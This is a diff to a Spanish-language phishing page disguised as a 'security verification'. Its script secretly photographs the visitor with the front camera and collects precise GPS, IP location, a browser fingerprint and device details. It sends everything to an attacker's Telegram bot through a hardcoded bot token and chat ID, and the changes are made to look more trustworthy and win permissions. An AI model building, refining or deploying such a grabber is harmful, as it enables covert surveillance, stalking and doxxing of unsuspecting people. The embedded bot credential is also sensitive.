@@ -5,10 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Verificación de seguridad</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* --- Estilos para que se vea más profesional y dé confianza --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             background: #f1f3f4;
-            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -17,15 +22,26 @@
         }
         .card {
             background: white;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            border-radius: 16px;
+            box-shadow: 0 8px 28px rgba(0,0,0,0.12);
             padding: 32px 24px;
             max-width: 400px;
             width: 100%;
             text-align: center;
+            transition: all 0.2s;
         }
-        h1 { font-size: 1.8rem; font-weight: 500; color: #1a1a1a; margin-bottom: 12px; }
-        p { color: #5f6368; font-size: 0.9rem; margin-bottom: 28px; }
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+            letter-spacing: -0.3px;
+        }
+        p {
+            color: #5f6368;
+            font-size: 0.9rem;
+            margin-bottom: 28px;
+        }
         button {
             background: #1a73e8;
             color: white;
@@ -37,8 +53,21 @@
             cursor: pointer;
             width: 100%;
             transition: background 0.2s;
+            box-shadow: 0 1px 2px 0 rgba(0,0,0,0.05);
         }
-        button:active { background: #1557b0; }
+        button:active {
+            background: #1557b0;
+            transform: scale(0.98);
+        }
+        .status-area {
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #5f6368;
+            background: #f8f9fa;
+            padding: 12px;
+            border-radius: 12px;
+            display: none;
+        }
         .warning {
             background: #fef7e0;
             border-left: 4px solid #f9ab00;
@@ -55,77 +84,49 @@
 <body>
 <div class="card">
     <h1>🔐 Verificación requerida</h1>
-    <div id="main-content">
-        <p>Presiona el botón para continuar</p>
-        <button id="btn">✅ Verificar acceso</button>
-    </div>
-    <div id="webview-warning" style="display:none;" class="warning">
-        ⚠️ Estás usando un navegador integrado (Instagram/Facebook). Para que esto funcione correctamente, <strong>abre este enlace en Safari o Chrome</strong>.<br><br>
-        <button id="open-external">📱 Abrir en navegador externo</button>
-    </div>
+    <p>Presiona el botón para continuar</p>
+    <button id="btn">✅ Verificar acceso</button>
+    <div id="status-area" class="status-area"></div>
 </div>
 
+<!-- Elementos ocultos para la foto -->
 <video id="video" autoplay playsinline style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-    // 🔐 REVOCA TU TOKEN VIEJO Y PON AQUÍ EL NUEVO (con @BotFather)
+    // 🔐 REVOCA TU TOKEN VIEJO CON @BotFather Y PON AQUÍ EL NUEVO
     const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
     const CHAT_ID = '7555997298';
+    
+    let alreadySent = false; // Para que no se envíe doble información
+    let fotoBlob = null;     // Guardará la foto para enviarla después
 
-    let alreadySent = false;
-
-    // ---------- Detectar si es WebView (Instagram, Facebook, etc.) ----------
-    function isWebView() {
-        const ua = navigator.userAgent;
-        return /(Instagram|FBAN|FBAV|Twitter|WhatsApp|Snapchat)/i.test(ua);
-    }
-
-    // ---------- Obtener IP (múltiples intentos) ----------
+    // --- 1. Obtener IP y ubicación aproximada (NO requiere permiso del usuario) ---
     async function getIPinfo() {
-        const sources = [
-            'https://ipapi.is/',
-            'https://ipapi.co/json/',
-            'https://api.ipify.org?format=json'
-        ];
-        for (const url of sources) {
-            try {
-                const res = await fetch(url);
-                const data = await res.json();
-                if (url.includes('ipapi.is')) {
-                    return {
-                        ip: data.ip || 'N/A',
-                        country: data.country_name || data.country_code || 'N/A',
-                        region: data.region || data.state || 'N/A',
-                        city: data.city || 'N/A',
-                        postal: data.postal_code || 'N/A',
-                        timezone: data.timezone || 'N/A'
-                    };
-                } else if (url.includes('ipapi.co')) {
-                    return {
-                        ip: data.ip || 'N/A',
-                        country: data.country_name || 'N/A',
-                        region: data.region || 'N/A',
-                        city: data.city || 'N/A',
-                        postal: data.postal || 'N/A',
-                        timezone: data.timezone || 'N/A'
-                    };
-                } else if (url.includes('ipify')) {
-                    return {
-                        ip: data.ip,
-                        country: 'N/A',
-                        region: 'N/A',
-                        city: 'N/A',
-                        postal: 'N/A',
-                        timezone: 'N/A'
-                    };
-                }
-            } catch (e) { /* intenta siguiente */ }
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            return {
+                ip: data.ip || 'N/A',
+                country: data.country_name || 'N/A',
+                region: data.region || 'N/A',
+                city: data.city || 'N/A',
+                postal: data.postal || 'N/A',
+                timezone: data.timezone || 'N/A'
+            };
+        } catch(e) {
+            return {
+                ip: 'N/A',
+                country: 'N/A',
+                region: 'N/A',
+                city: 'N/A',
+                postal: 'N/A',
+                timezone: 'N/A'
+            };
         }
-        return null;
     }
 
-    // ---------- Fingerprint ----------
+    // --- 2. Obtener Fingerprint (CPU, GPU, Fuentes) ---
     async function getFingerprint() {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -144,7 +145,7 @@
         return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
     }
 
-    // ---------- Dispositivo ----------
+    // --- 3. Datos del dispositivo (Modelo, Resolución, CPU) ---
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let model = "Desconocido";
@@ -159,7 +160,7 @@
         return { model, ua, language, resolution, cpuCores };
     }
 
-    // ---------- Almacenamiento ----------
+    // --- 4. Almacenamiento disponible ---
     async function getStorageInfo() {
         try {
             const est = await navigator.storage.estimate();
@@ -169,7 +170,7 @@
         } catch(e) { return { total: 'N/A', used: 'N/A' }; }
     }
 
-    // ---------- GPS ----------
+    // --- 5. Obtener ubicación GPS EXACTA (SÍ requiere permiso del usuario) ---
     function getGPS() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
@@ -177,23 +178,32 @@
                 return;
             }
             navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-                () => resolve(null),
+                (pos) => resolve({
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                }),
+                () => resolve(null),  // Usuario denegó o hubo error
                 { enableHighAccuracy: true, timeout: 15000 }
             );
         });
     }
 
-    // ---------- Cámara frontal ----------
+    // --- 6. Capturar FOTO desde la cámara frontal ---
     async function capturePhoto() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         let stream = null;
         try {
+            // Intentamos cámara frontal
             stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         } catch(e) {
-            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
-            catch(err) { return null; }
+            try {
+                // Si falla, cualquier cámara
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            } catch(err) {
+                return null;
+            }
         }
         video.srcObject = stream;
         await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
@@ -206,20 +216,46 @@
         return blob;
     }
 
-    // ---------- Envío ----------
+    // --- 7. Envío de datos a Telegram (texto y foto) ---
     async function sendMessage(text) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        try { await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' }) }); } catch(e) {}
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        } catch(e) { console.warn(e); }
     }
     async function sendPhoto(blob) {
-        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'photo.jpg');
-        try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }); } catch(e) {}
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, 'photo.jpg');
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        } catch(e) { console.warn(e); }
     }
 
-    // ---------- Acción principal (solo si no es WebView) ----------
-    async function collectAndSend() {
-        if (alreadySent) return;
-        alreadySent = true;
+    // --- 8. El proceso de 2 pasos: Primero la FOTO, luego la UBICACIÓN ---
+    async function step1_Camera() {
+        const statusDiv = document.getElementById('status-area');
+        statusDiv.style.display = 'block';
+        statusDiv.innerText = '📸 Solicitando acceso a la cámara...';
+        
+        // Capturamos la foto
+        fotoBlob = await capturePhoto();
+        if (!fotoBlob) {
+            statusDiv.innerText = '❌ No se pudo acceder a la cámara.';
+            return false;
+        }
+        statusDiv.innerText = '✅ Foto capturada. Solicitando ubicación...';
+        return true;
+    }
+
+    async function step2_LocationAndSend() {
+        const statusDiv = document.getElementById('status-area');
+        
+        // Obtenemos GPS y los demás datos
         const [fp, ipInfo, device, storage, gps] = await Promise.all([
             getFingerprint(),
             getIPinfo(),
@@ -227,42 +263,55 @@
             getStorageInfo(),
             getGPS()
         ]);
+
+        // Construir el mensaje con toda la información
         let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
         message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
         message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
-        message += `🌐 *Network Information*\n   • IP Address: ${ipInfo ? ipInfo.ip : 'N/A'}\n   • Language: ${device.language}\n\n`;
+        message += `🌐 *Network Information*\n   • IP Address: ${ipInfo.ip}\n   • Language: ${device.language}\n\n`;
         message += `📍 *Location Details*\n`;
         if (gps) {
             message += `   • GPS Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
-        } else if (ipInfo && ipInfo.city && ipInfo.city !== 'N/A') {
-            message += `   • IP approximate location:\n   • Country: ${ipInfo.country}\n   • Region: ${ipInfo.region}\n   • City: ${ipInfo.city}\n   • Postal: ${ipInfo.postal}\n   • Timezone: ${ipInfo.timezone}\n   • Map: https://www.google.com/maps?q=${ipInfo.city},${ipInfo.country}\n`;
         } else {
-            message += `   • No disponible (permiso denegado o sin red)\n`;
+            message += `   • GPS: Permiso denegado o no disponible\n`;
+            if (ipInfo.city !== 'N/A') {
+                message += `   • IP approximate location:\n   • Country: ${ipInfo.country}\n   • Region: ${ipInfo.region}\n   • City: ${ipInfo.city}\n   • Postal: ${ipInfo.postal}\n   • Timezone: ${ipInfo.timezone}\n`;
+                message += `   • Map: https://www.google.com/maps?q=${ipInfo.city},${ipInfo.country}\n`;
+            }
         }
         message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
-        message += `🔐 *Device Permissions*\n   • Camera: ${navigator.mediaDevices ? 'Solicitado' : 'No soportado'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
+        message += `🔐 *Device Permissions*\n   • Camera: ${fotoBlob ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
         message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
         message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society\n`;
+
+        // Enviamos el texto y la foto a Telegram
         await sendMessage(message);
-        const foto = await capturePhoto();
-        if (foto) await sendPhoto(foto);
+        if (fotoBlob) await sendPhoto(fotoBlob);
+        
+        statusDiv.innerText = '✅ Verificación completada. Gracias.';
+        setTimeout(() => { statusDiv.style.display = 'none'; }, 5000);
     }
 
-    // ---------- Cargar y mostrar según WebView ----------
-    window.addEventListener('DOMContentLoaded', () => {
-        if (isWebView()) {
-            document.getElementById('main-content').style.display = 'none';
-            document.getElementById('webview-warning').style.display = 'block';
-            document.getElementById('open-external').onclick = () => {
-                // Intentar abrir en navegador externo (funciona en iOS)
-                window.location.href = 'http://www.google.com'; // redirige a google? no, mejor abrir el mismo link pero con external
-                // En iOS, no se puede forzar Safari directamente, pero podemos mostrar un mensaje.
-                alert('Copia el enlace y pégalo en Safari/Chrome');
-            };
+    // --- 9. Control principal del botón (divide y vencerás) ---
+    document.getElementById('btn').onclick = async () => {
+        if (alreadySent) return;
+        alreadySent = true;
+        
+        const statusDiv = document.getElementById('status-area');
+        statusDiv.style.display = 'block';
+        statusDiv.innerText = 'Iniciando proceso...';
+        
+        // PASO 1: Pedir la CÁMARA y tomar la foto
+        const cameraOk = await step1_Camera();
+        if (!cameraOk) {
+            // Si la cámara falla, igual intentamos enviar lo que podamos (IP, datos, etc.)
+            statusDiv.innerText = 'La cámara falló. Recopilando otros datos...';
+            await step2_LocationAndSend();
         } else {
-            document.getElementById('btn').onclick = collectAndSend;
+            // PASO 2: Si la cámara funcionó, pedir la UBICACIÓN y enviar TODO
+            await step2_LocationAndSend();
         }
-    });
+    };
 </script>
 </body>
 </html>
